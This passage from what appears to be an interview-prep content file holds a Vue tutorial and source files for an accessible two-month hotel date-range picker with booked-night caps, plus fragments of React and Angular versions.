    if ((min && iso < min) || (max && iso > max)) return;
    const left = view.slice(0, 7),
      right = addMonths(view, 1).slice(0, 7);
    if (iso.slice(0, 7) < left)
      setView(iso.slice(0, 7) + "-01"); // scroll back
    else if (iso.slice(0, 7) > right)
      setView(addMonths(iso.slice(0, 7) + "-01", -1)); // scroll on
    setFocused(iso);
    setHover(iso); // keyboard users get the same preview as mouse users
    wantFocus.current = true;
  }

  useEffect(() => {
    if (!wantFocus.current) return;
    wantFocus.current = false;
    rootRef.current?.querySelector('[tabindex="0"]')?.focus();
  });

  function onKey(e) {
    const f = focused,
      dow = weekday(f);
    const moves = {
      ArrowLeft: -1,
      ArrowRight: 1,
      ArrowUp: -7,
      ArrowDown: 7,
      Home: -dow,
      End: 6 - dow,
    };
    if (e.key in moves) {
      e.preventDefault();
      moveFocus(addDays(f, moves[e.key]));
    } else if (e.key === "PageUp" || e.key === "PageDown") {
      e.preventDefault();
      moveFocus(addMonths(f, e.key === "PageUp" ? -1 : 1));
    } else if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      choose(f);
    } else if (e.key === "Escape" && choosingEnd) {
      e.preventDefault();
      setRange({ start: null, end: null });
      setHover(null);
    }
  }

  function onOver(e) {
    const iso = e.target.closest?.("[data-date]")?.getAttribute("data-date");
    if (iso && iso !== hover) setHover(iso);
  }

  // Focus may sit in a month that scrolled out
  // of view; keep one visible day tabbable.
  const shown = [view.slice(0, 7), addMonths(view, 1).slice(0, 7)];
  const visibleFocus = shown.includes(focused.slice(0, 7))
    ? focused
    : min && view < min
      ? min
      : view;

  const nights = start && end ? diffDays(start, end) : 0;
  const status = !start
    ? "Select a check-in date."
    : !end
      ? \`Check-in \${shortLabel(start)}. Select a check-out date\${maxEnd ? \` (latest \${shortLabel(maxEnd)})\` : ""}.\`
      : \`\${shortLabel(start)} to \${shortLabel(end)}, \${nights} night\${nights === 1 ? "" : "s"}.\`;

  const canPrev = !min || toISO(months[0].y, months[0].m, 0) >= min;
  const canNext = !max || toISO(months[1].y, months[1].m + 1, 1) <= max;

  return (
    <div
      className="rp"
      ref={rootRef}
      onKeyDown={onKey}
      onMouseOver={onOver}
      onMouseLeave={() => setHover(null)}
    >
      <div className="rp-nav">
        <button
          type="button"
          aria-label="Previous month"
          disabled={!canPrev}
          onClick={() => setView(addMonths(view, -1))}
        >
          {"‹"}
        </button>
        <button
          type="button"
          aria-label="Next month"
          disabled={!canNext}
          onClick={() => setView(addMonths(view, 1))}
        >
          {"›"}
        </button>
      </div>
      <div className="rp-months">
        {months.map(({ y, m }) => {
          const id = \`rp-\${y}-\${m}\`;
          const cells = monthCells(y, m);
          return (
            <section key={id} className="rp-month">
              <h3 id={id}>
                {MONTHS[m]} {y}
              </h3>
              <table
                role="grid"
                aria-labelledby={id}
                aria-multiselectable="true"
              >
                <thead>
                  <tr>
                    {DAYS.map((d) => (
                      <th key={d} scope="col" abbr={d}>
                        {d.slice(0, 2)}
                      </th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {[0, 1, 2, 3, 4, 5].map((r) => (
                    <tr key={r}>
                      {cells.slice(r * 7, r * 7 + 7).map((iso, i) => {
                        if (!iso) return <td key={i} role="presentation" />;
                        const st = stateOf(iso);
                        const off = unavailable(iso);
                        return (
                          <td
                            key={iso}
                            data-date={iso}
                            data-state={st || undefined}
                            className={"day " + st + (off ? " off" : "")}
                            tabIndex={iso === visibleFocus ? 0 : -1}
                            aria-label={
                              shortLabel(iso) +
                              (blocked.includes(iso) ? ", unavailable" : "")
                            }
                            aria-selected={
                              st === "start" || st === "end" || st === "range"
                            }
                            aria-disabled={off || undefined}
                            onClick={() => {
                              setFocused(iso);
                              choose(iso);
                            }}
                          >
                            {+iso.slice(8)}
                          </td>
                        );
                      })}
                    </tr>
                  ))}
                </tbody>
              </table>
            </section>
          );
        })}
      </div>
      <div className="rp-foot">
        <p role="status" aria-live="polite" data-testid="status">
          {status}
        </p>
        <button
          type="button"
          disabled={!start}
          onClick={() => {
            setRange({ start: null, end: null });
            setHover(null);
          }}
        >
          Clear
        </button>
      </div>
    </div>
  );
}
`,
        },
      },
      vue: {
        answer: `**Target Audience:** Vue developers who can build a single-date picker and want the range version. Assumes \`<script setup>\`, \`ref\`, \`computed\` and emits.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. The "Verified" output was printed by this Vue 3.5.44 solution in jsdom, driven by a script with \`TZ=America/New_York\` so a daylight saving change falls inside the test stay.

## 1. Why This Even Matters — A Story First

A hotel receptionist runs a finger along the calendar while you decide when to leave, and stops it at the first night that is already sold. The finger is the hover preview, the stop is the blocked-night cap, and "six nights" is the night count. This is the single-date picker from [Build a Calendar / Date Picker](/interview-question/build-a-calendar-date-picker) plus that conversation; the ISO-string dates, UTC math and roving tabindex are reused and not re-explained.

## 2. Requirements and the Vue State Model

Two months side by side, check-in then check-out, hover and keyboard preview, booked nights that a stay can never include, a live status line with the night count, and \`change\` emitted with \`[start, end]\` once complete.

| Piece | Vue tool | Notes |
| :--- | :--- | :--- |
| \`range\` \`{ start, end }\` | \`ref\` | The only selection state; replaced as a whole object on each pick. |
| \`hover\`, \`focused\`, \`view\` | \`ref\` | Preview end, roving tabindex target, first day of the left month. |
| \`choosingEnd\`, \`maxEnd\`, \`previewEnd\` | \`computed\` | Derived rules. |
| \`months\` (two grids of rows) | \`computed\` | Rebuilt only when \`view\` changes. |
| \`status\` | \`computed\` | The live region text. |
| Output | \`defineEmits(["change"])\` | Emitted only for a complete range. |

📌 **Interview term: Declared emits** — listing \`change\` in \`defineEmits\` makes it a component event, so the parent's \`@change\` listens to the component and is not added as a native DOM listener on its root element ([why declare emits](/interview-question/why-declare-emits-and-can-you-validate-them)).

## 3. Build It Step by Step

### 3.1 A pure \`pick\` function

All transitions live in plain JavaScript shared with the other frameworks:

\`\`\`js
export function pick({ start, end }, iso, ctx) {
  if (ctx.isBlocked(iso)) return { start, end };
  // begin a new range
  if (!start || end || iso < start) return { start: iso, end: null };
  if (iso === start) return { start, end }; // need at least one night
  // would span a blocked date
  if (iso > ctx.maxEnd) return { start, end };
  return { start, end: iso };
}
\`\`\`

📌 **Interview term: State machine** — three states (no start, choosing end, complete) with explicit transitions. Click-before-start, click-after-complete and Escape become rows in a table instead of special cases in the template.

### 3.2 Computed rules

\`\`\`js
const choosingEnd = computed(
  () => !!range.value.start && !range.value.end,
);
const maxEnd = computed(() =>
  choosingEnd.value
    ? maxEndFor(range.value.start, props.blocked, props.max)
    : null,
);
const previewEnd = computed(() => {
  const h = hover.value,
    s = range.value.start;
  return choosingEnd.value && h && h > s
    ? h > maxEnd.value
      ? maxEnd.value
      : h
    : null;
});
\`\`\`

\`maxEndFor\` returns the night before the first booked date after check-in. Every day after it is unavailable while choosing, and the preview is clamped to it. Because these are [computed](/interview-question/what-is-the-difference-between-computed-and-watch) values, they only re-run when \`range\`, \`hover\` or the props they read change.

📌 **Interview term: Derived UI state** — "is this cell in the range?" is a function of \`range\`, \`hover\` and \`maxEnd\`, evaluated in the template through \`stateOf(iso)\`. Nothing per cell is stored.

### 3.3 One listener for 84 cells

\`\`\`vue
<div class="rp" ref="root" @keydown="onKey" @mouseover="onOver" @mouseleave="hover = null">
\`\`\`

\`\`\`js
function onOver(e) {
  const iso = e.target
    .closest?.("[data-date]")
    ?.getAttribute("data-date");
  if (iso && iso !== hover.value) hover.value = iso;
}
\`\`\`

\`mouseover\` bubbles, so one handler on the root serves every cell ([event delegation](/interview-question/what-is-event-delegation)). \`mouseleave\` does not bubble and fires once, when the pointer leaves the whole calendar.

### 3.4 Blank padding cells with \`<template v-for>\`

Out-of-month cells are \`null\` in a two-month view. A \`<template v-for>\` lets one loop emit either a blank cell or a day:

\`\`\`vue
<template v-for="(iso, i) in row" :key="iso || 'pad' + i">
  <td v-if="!iso" role="presentation"></td>
  <td v-else :data-date="iso" :data-state="stateOf(iso) || undefined"
    :class="['day', stateOf(iso), { off: unavailable(iso) }]"
    :tabindex="iso === visibleFocus ? 0 : -1"
    :aria-selected="['start', 'end', 'range'].includes(stateOf(iso))"
    :aria-disabled="unavailable(iso) || undefined"
    @click="focused = iso; choose(iso)">{{ +iso.slice(8) }}</td>
</template>
\`\`\`

The key goes on the \`<template>\`, and padding cells get keys of their own so they never collide with a date ([keys in v-for](/interview-question/why-is-the-key-attribute-important-in-v-for)).

### 3.5 Keyboard focus across two months

\`\`\`js
async function moveFocus(iso) {
  if ((props.min && iso < props.min) || (props.max && iso > props.max))
    return;
  const left = view.value.slice(0, 7),
    right = addMonths(view.value, 1).slice(0, 7);
  if (iso.slice(0, 7) < left) view.value = iso.slice(0, 7) + "-01";
  else if (iso.slice(0, 7) > right)
    view.value = addMonths(iso.slice(0, 7) + "-01", -1);
  focused.value = iso;
  // keyboard users get the same preview as mouse users
  hover.value = iso;
  await nextTick();
  root.value?.querySelector('[tabindex="0"]')?.focus();
}
\`\`\`

📌 **Interview term: Roving tabindex across grids** — the two month tables act as one widget with one tabbable day, wherever it is. \`visibleFocus\` is a computed that falls back to the first in-range day of the left month when the nav buttons scroll the focused day out of view, so Tab never skips the calendar.

### 3.6 Nights in UTC

\`diffDays\` subtracts two UTC midnights. With \`TZ=America/New_York\`, local midnights on 7 and 9 March 2026 are 47 hours apart (\`1.9583333333333333\` days in a Node check), so \`Math.floor\` on local dates would charge one night instead of two.

## 4. Verified

Vue 3.5.44, jsdom, \`TZ=America/New_York\`, booked nights 12, 13 and 27 March 2026, \`min="2026-03-02"\`. The driver dispatched real bubbling \`mouseover\` events, clicks and keys; React and Angular printed the same lines:

\`\`\`text
TZ=America/New_York months: March 2026 | April 2026 | prev disabled: true
status: Select a check-in date.
click booked Mar 12 -> Select a check-in date.
click Mar 5 -> Check-in Thu, Mar 5. Select a check-out date (latest Wed, Mar 11).
hover Mar 9 -> preview: 03-06 03-07 03-08 03-09
hover Mar 20 -> preview: 03-06 03-07 03-08 03-09 03-10 03-11 | Mar 14 aria-disabled: true
mouse leaves -> preview: (none)
click Mar 3 (before start) -> Check-in Tue, Mar 3. Select a check-out date (latest Wed, Mar 11).
click Mar 9 -> Tue, Mar 3 to Mon, Mar 9, 6 nights. | range: 03-04 03-05 03-06 03-07 03-08 | onChange: 2026-03-03 to 2026-03-09
aria-selected cells: 03-03 03-04 03-05 03-06 03-07 03-08 03-09
Enter on 2026-03-09 -> Check-in Mon, Mar 9. Select a check-out date (latest Wed, Mar 11).
Right x3 -> focus 2026-03-12 | preview: 03-10 03-11
Enter on booked day -> Check-in Mon, Mar 9. Select a check-out date (latest Wed, Mar 11).
Escape -> Select a check-in date.
start Mar 28, Down -> focus 2026-04-04 | preview: 03-29 03-30 03-31 04-01 04-02 04-03 04-04
Enter -> Sat, Mar 28 to Sat, Apr 4, 7 nights. | onChange: 2026-03-28 to 2026-04-04
PageDown x2 -> focus 2026-06-04 | months: May 2026 | June 2026 | tabindex=0: 1
Prev x2 -> months: March 2026 | April 2026 | tabbable day: 2026-03-02
Clear -> Select a check-in date. | selected: 0
\`\`\`

Read it as: the preview from the 5th stopped at the 11th; clicking the 3rd restarted the range; 3 to 9 March is **6 nights** across the DST weekend; Enter on a booked day changed nothing; a stay crossed from March into April; PageDown scrolled the view to May and June. jsdom has no pointer, so \`mouseleave\` was dispatched by the driver, and colours and layout were not checked.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Blocked night inside the stay | Impossible: \`maxEnd\` cap while choosing |
| Restart, one-night minimum | \`pick\` |
| Focus scrolled off-screen | \`visibleFocus\` computed |
| Screen readers | \`aria-selected\`, \`aria-multiselectable\`, \`aria-disabled\`, ", unavailable" in labels, \`role="status"\` text |
| DST | UTC night count |

## 6. Common Pitfalls

- **Writing \`range.value.start\` and \`.end\` in two steps.** Each write is a separate state; replace the object once.
- **\`@mouseenter\` on every cell.** 84 listeners where one delegated \`mouseover\` does the job.
- **An undeclared \`change\` emit.** Without \`defineEmits\`, a parent \`@change\` also becomes a native listener on the root element and catches DOM change events.
- **Counting nights on local dates.** Off by one across DST.
- **Preview for mouse only.** Update \`hover\` on keyboard moves too.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Reuse:</strong> <span style="color:#f0e2c8;">"Same ISO date helpers as the single picker, with a two-month computed grid and blank padding cells."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Machine:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">range</code> is one ref; a pure <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">pick</code> decides new range, restart, the one-night minimum and the blocked cap."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Computed:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">choosingEnd</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEnd</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">previewEnd</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">status</code> are computed, and each cell derives its state."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Events:</strong> <span style="color:#f0e2c8;">"One delegated <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mouseover</code> plus keyboard moves set <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">hover</code>; <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mouseleave</code> clears it."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. A11y:</strong> <span style="color:#f0e2c8;">"A roving <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">tabindex</code> across both months, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">nextTick</code> focus, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-selected</code> on the stay and a live status line."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Would you use <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">v-model</code> for the range?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Yes in a form: <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">defineModel</code> with an array value, written only when the range completes. The half-made range stays local so the parent never sees <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">[start, null]</code>.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you show prices per night?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Fetch a price map for the visible window when <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">view</code> changes, render it in the cell, and total <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">diffDays</code> nights; cache by month.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test the preview?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Mount with Vue Test Utils, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">trigger("mouseover")</code> on a cell, await <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">nextTick</code>, assert <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">data-state="preview"</code> on the expected cells, and unit-test <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">pick</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEndFor</code> directly.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">What if booked dates load asynchronously?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Pass them as a prop; <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEnd</code> is computed, so the cap updates when the data arrives. Disable picking until the first load so you never accept a stay that becomes invalid.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **State machine** | Named states plus explicit transitions |
| **Declared emits** | Component events listed in \`defineEmits\` |
| **Derived UI state** | Per-cell flags computed during render |
| **Roving tabindex across grids** | One tabbable day for both months |
| **Blocked-night cap** | Latest check-out before the next booked date |

---
**Conclusion:** In Vue the range picker is a small state machine plus computed rules: \`range\` holds the selection, \`maxEnd\` and \`previewEnd\` derive the cap and the preview, one delegated listener drives hover, and \`nextTick\` keeps keyboard focus visible across two months. The verified run shows the cap at 11 March, a cross-month stay, and six correct nights across the DST weekend.`,
        files: {
          "/src/App.vue": `<script setup>
import { ref } from "vue";
import RangePicker from "./components/RangePicker.vue";

const BOOKED = ["2026-03-12", "2026-03-13", "2026-03-27"];
const stay = ref(null);
</script>

<template>
  <main class="page">
    <h1 style="font-size: 18px">Book your stay</h1>
    <RangePicker
      initial-month="2026-03-05"
      min="2026-03-02"
      max="2026-12-31"
      :blocked="BOOKED"
      @change="stay = $event"
    />
    <p
      class="out"
      data-testid="out"
    >onChange: {{ stay ? stay.join(" to ") : "nothing yet" }}</p>
  </main>
</template>

<style>
body {
  margin: 0;
  background: #0f1115;
  color: #e6e6e6;
  font-family: system-ui, sans-serif;
}
.page {
  max-width: 720px;
  margin: 0 auto;
  padding: 24px 16px;
}
.rp {
  position: relative;
  background: #171a21;
  border: 1px solid #2c3340;
  border-radius: 12px;
  padding: 12px;
}
.rp-nav {
  position: absolute;
  top: 10px;
  left: 8px;
  right: 8px;
  display: flex;
  justify-content: space-between;
  pointer-events: none;
}
.rp-nav button {
  pointer-events: auto;
  background: none;
  border: 0;
  color: #c9d1d9;
  font-size: 20px;
  width: 32px;
  height: 32px;
  border-radius: 6px;
  cursor: pointer;
}
.rp-nav button:disabled {
  opacity: 0.3;
}
.rp-months {
  display: flex;
  flex-wrap: wrap;
  gap: 16px;
}
.rp-month {
  flex: 1 1 260px;
}
.rp-month h3 {
  text-align: center;
  font-size: 15px;
  margin: 6px 0 10px;
}
table {
  width: 100%;
  border-collapse: collapse;
}
th {
  font-size: 12px;
  color: #8b949e;
  font-weight: 500;
  padding: 4px 0;
}
td.day {
  text-align: center;
  padding: 8px 0;
  font-size: 14px;
  cursor: pointer;
}
td.day:focus {
  outline: 2px solid #f9a825;
  outline-offset: -2px;
}
td.range {
  background: #3d2810;
}
td.preview {
  background: #2a2214;
  box-shadow: inset 0 0 0 1px #6b5320;
}
td.start,
td.end {
  background: #f9a825;
  color: #1c140a;
  font-weight: 700;
}
td.start {
  border-radius: 8px 0 0 8px;
}
td.end {
  border-radius: 0 8px 8px 0;
}
td.off {
  color: #474e5a;
  text-decoration: line-through;
  cursor: not-allowed;
}
.rp-foot {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
  border-top: 1px solid #2c3340;
  margin-top: 8px;
  padding-top: 8px;
}
.rp-foot p {
  margin: 0;
  font-size: 14px;
  color: #c9d1d9;
}
.rp-foot button {
  background: #222834;
  color: #e6e6e6;
  border: 1px solid #2c3340;
  border-radius: 8px;
  padding: 6px 12px;
  cursor: pointer;
}
.out {
  color: #9aa4b2;
  font-size: 14px;
}
</style>
`,
          "/src/components/RangePicker.vue": `<script setup>
import { computed, nextTick, ref } from "vue";
import {
  DAYS,
  MONTHS,
  addDays,
  addMonths,
  diffDays,
  maxEndFor,
  monthCells,
  monthOf,
  pick,
  shortLabel,
  toISO,
  weekday,
} from "../dates.js";

const props = defineProps({
  min: String,
  max: String,
  blocked: { type: Array, default: () => [] },
  initialMonth: { type: String, required: true },
});
// fires with [start, end] once a range is complete
const emit = defineEmits(["change"]);

const range = ref({ start: null, end: null });
const hover = ref(null); // preview end while choosing check-out
const focused = ref(props.initialMonth); // roving tabindex target
const view = ref(props.initialMonth.slice(0, 7) + "-01"); // left month
const root = ref(null);

const choosingEnd = computed(() => !!range.value.start && !range.value.end);
const maxEnd = computed(() =>
  choosingEnd.value
    ? maxEndFor(range.value.start, props.blocked, props.max)
    : null,
);
const isBlocked = (iso) =>
  props.blocked.includes(iso) ||
  (props.min && iso < props.min) ||
  (props.max && iso > props.max);
const unavailable = (iso) =>
  !!(isBlocked(iso) || (choosingEnd.value && iso > maxEnd.value));
const previewEnd = computed(() => {
  const h = hover.value,
    s = range.value.start;
  return choosingEnd.value && h && h > s
    ? h > maxEnd.value
      ? maxEnd.value
      : h
    : null;
});
const months = computed(() =>
  [view.value, addMonths(view.value, 1)].map((iso) => {
    const { y, m } = monthOf(iso);
    const cells = monthCells(y, m);
    return {
      y,
      m,
      id: \`rp-\${y}-\${m}\`,
      rows: [0, 1, 2, 3, 4, 5].map((r) => cells.slice(r * 7, r * 7 + 7)),
    };
  }),
);
// Focus may sit in a month that scrolled out
// of view; keep one visible day tabbable.
const visibleFocus = computed(() => {
  const shown = [view.value.slice(0, 7), addMonths(view.value, 1).slice(0, 7)];
  if (shown.includes(focused.value.slice(0, 7))) return focused.value;
  return props.min && view.value < props.min ? props.min : view.value;
});

function stateOf(iso) {
  const { start, end } = range.value;
  if (iso === start) return "start";
  if (iso === end) return "end";
  if (end && iso > start && iso < end) return "range";
  if (previewEnd.value && iso > start && iso <= previewEnd.value)
    return "preview";
  return "";
}

function choose(iso) {
  const next = pick(range.value, iso, { isBlocked, maxEnd: maxEnd.value });
  if (next.start === range.value.start && next.end === range.value.end) return;
  range.value = next;
  hover.value = null;
  if (next.end) emit("change", [next.start, next.end]);
}
function clear() {
  range.value = { start: null, end: null };
  hover.value = null;
}

async function moveFocus(iso) {
  if ((props.min && iso < props.min) || (props.max && iso > props.max)) return;
  const left = view.value.slice(0, 7),
    right = addMonths(view.value, 1).slice(0, 7);
  if (iso.slice(0, 7) < left) view.value = iso.slice(0, 7) + "-01";
  else if (iso.slice(0, 7) > right)
    view.value = addMonths(iso.slice(0, 7) + "-01", -1);
  focused.value = iso;
  hover.value = iso; // keyboard users get the same preview as mouse users
  await nextTick();
  root.value?.querySelector('[tabindex="0"]')?.focus();
}

function onKey(e) {
  const f = focused.value,
    dow = weekday(f);
  const moves = {
    ArrowLeft: -1,
    ArrowRight: 1,
    ArrowUp: -7,
    ArrowDown: 7,
    Home: -dow,
    End: 6 - dow,
  };
  if (e.key in moves) {
    e.preventDefault();
    moveFocus(addDays(f, moves[e.key]));
  } else if (e.key === "PageUp" || e.key === "PageDown") {
    e.preventDefault();
    moveFocus(addMonths(f, e.key === "PageUp" ? -1 : 1));
  } else if (e.key === "Enter" || e.key === " ") {
    e.preventDefault();
    choose(f);
  } else if (e.key === "Escape" && choosingEnd.value) {
    e.preventDefault();
    clear();
  }
}
function onOver(e) {
  const iso = e.target.closest?.("[data-date]")?.getAttribute("data-date");
  if (iso && iso !== hover.value) hover.value = iso;
}

const status = computed(() => {
  const { start, end } = range.value;
  if (!start) return "Select a check-in date.";
  if (!end)
    return \`Check-in \${shortLabel(start)}. Select a check-out date\${maxEnd.value ? \` (latest \${shortLabel(maxEnd.value)})\` : ""}.\`;
  const n = diffDays(start, end);
  return \`\${shortLabel(start)} to \${shortLabel(end)}, \${n} night\${n === 1 ? "" : "s"}.\`;
});
const canPrev = computed(
  () =>
    !props.min || toISO(months.value[0].y, months.value[0].m, 0) >= props.min,
);
const canNext = computed(
  () =>
    !props.max ||
    toISO(months.value[1].y, months.value[1].m + 1, 1) <= props.max,
);
</script>

<template>
  <div
    class="rp"
    ref="root"
    @keydown="onKey"
    @mouseover="onOver"
    @mouseleave="hover = null"
  >
    <div class="rp-nav">
      <button
        type="button"
        aria-label="Previous month"
        :disabled="!canPrev"
        @click="view = addMonths(view, -1)"
      >&lsaquo;</button>
      <button
        type="button"
        aria-label="Next month"
        :disabled="!canNext"
        @click="view = addMonths(view, 1)"
      >&rsaquo;</button>
    </div>
    <div class="rp-months">
      <section v-for="mo in months" :key="mo.id" class="rp-month">
        <h3 :id="mo.id">{{ MONTHS[mo.m] }} {{ mo.y }}</h3>
        <table role="grid" :aria-labelledby="mo.id" aria-multiselectable="true">
          <thead><tr><th v-for="d in DAYS" :key="d" scope="col" :abbr="d">{{ d.slice(0, 2) }}</th></tr></thead>
          <tbody>
            <tr v-for="(row, r) in mo.rows" :key="r">
              <template v-for="(iso, i) in row" :key="iso || 'pad' + i">
                <td v-if="!iso" role="presentation"></td>
                <td v-else :data-date="iso" :data-state="stateOf(iso) || undefined"
                  :class="['day', stateOf(iso), { off: unavailable(iso) }]"
                  :tabindex="iso === visibleFocus ? 0 : -1"
                  :aria-label="shortLabel(iso) + (blocked.includes(iso) ? ', unavailable' : '')"
                  :aria-selected="['start', 'end', 'range'].includes(stateOf(iso))"
                  :aria-disabled="unavailable(iso) || undefined"
                  @click="focused = iso; choose(iso)">{{ +iso.slice(8) }}</td>
              </template>
            </tr>
          </tbody>
        </table>
      </section>
    </div>
    <div class="rp-foot">
      <p role="status" aria-live="polite" data-testid="status">{{ status }}</p>
      <button
        type="button"
        :disabled="!range.start"
        @click="clear"
      >Clear</button>
    </div>
  </div>
</template>
`,
          "/src/dates.js": `// Calendar dates are ISO strings "YYYY-MM-DD": they compare with < and >,
// work as keys, and carry no time zone. Arithmetic goes through Date.UTC,
// which has no daylight-saving gaps.
export const MONTHS = [
  "January",
  "February",
  "March",
  "April",
  "May",
  "June",
  "July",
  "August",
  "September",
  "October",
  "November",
  "December",
];
export const DAYS = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

const pad = (n) => String(n).padStart(2, "0");
const utc = (iso) =>
  Date.UTC(+iso.slice(0, 4), +iso.slice(5, 7) - 1, +iso.slice(8, 10));
const fromUtc = (ms) => {
  const t = new Date(ms);
  return (
    t.getUTCFullYear() +
    "-" +
    pad(t.getUTCMonth() + 1) +
    "-" +
    pad(t.getUTCDate())
  );
};
export const toISO = (y, m, d) => fromUtc(Date.UTC(y, m, d));
// exact: UTC days are always 24h
export const addDays = (iso, n) => fromUtc(utc(iso) + n * 86400000);
export const diffDays = (a, b) => Math.round((utc(b) - utc(a)) / 86400000);
export const weekday = (iso) => new Date(utc(iso)).getUTCDay();
export const monthOf = (iso) => ({
  y: +iso.slice(0, 4),
  m: +iso.slice(5, 7) - 1,
});
export const addMonths = (iso, n) => {
  const { y, m } = monthOf(iso);
  const last = new Date(Date.UTC(y, m + n + 1, 0)).getUTCDate();
  return toISO(y, m + n, Math.min(+iso.slice(8, 10), last));
};
export const shortLabel = (iso) =>
  DAYS[weekday(iso)] +
  ", " +
  MONTHS[+iso.slice(5, 7) - 1].slice(0, 3) +
  " " +
  +iso.slice(8, 10);
// 42 cells; days outside the month are null (a two-month view hides them).
export function monthCells(y, m) {
  const first = toISO(y, m, 1);
  const lead = weekday(first);
  const len = new Date(Date.UTC(y, m + 1, 0)).getUTCDate();
  return Array.from({ length: 42 }, (_, i) =>
    i < lead || i >= lead + len ? null : addDays(first, i - lead),
  );
}

// Range rules shared by every framework version.
// The furthest check-out allowed: the night
// before the first blocked date after start.
export function maxEndFor(start, blocked, max) {
  const next = blocked.filter((b) => b > start).sort()[0];
  const cap = next ? addDays(next, -1) : max;
  return max && cap && cap > max ? max : cap;
}
// What a click (or Enter) on \`iso\` does to the current selection.
export function pick({ start, end }, iso, ctx) {
  if (ctx.isBlocked(iso)) return { start, end };
  // begin a new range
  if (!start || end || iso < start) return { start: iso, end: null };
  if (iso === start) return { start, end }; // need at least one night
  if (iso > ctx.maxEnd) return { start, end }; // would span a blocked date
  return { start, end: iso };
}
`,
        },
      },
      angular: {
        answer: `**Target Audience:** Angular developers who can build a single-date picker and want the range version. Assumes standalone components, signals and \`@Input\` / \`@Output\`.
